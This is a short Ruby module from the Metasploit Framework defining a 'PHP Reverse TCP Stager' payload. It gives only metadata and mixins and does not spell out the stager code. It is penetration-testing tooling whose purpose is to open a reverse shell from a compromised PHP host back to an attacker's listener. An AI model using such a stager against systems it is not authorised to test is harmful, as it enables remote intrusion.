##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/php/reverse_tcp'

module MetasploitModule

  CachedSize = 1116

  include Msf::Payload::Stager
  include Msf::Payload::Php::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'PHP Reverse TCP Stager',
      'Description' => 'Reverse PHP connect back stager with checks for disabled functions',
      'Author'      => 'egypt',
      'License'     => MSF_LICENSE,
      'Platform'    => 'php',
      'Arch'        => ARCH_PHP,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {'Payload' => ""}
    ))
  end
end
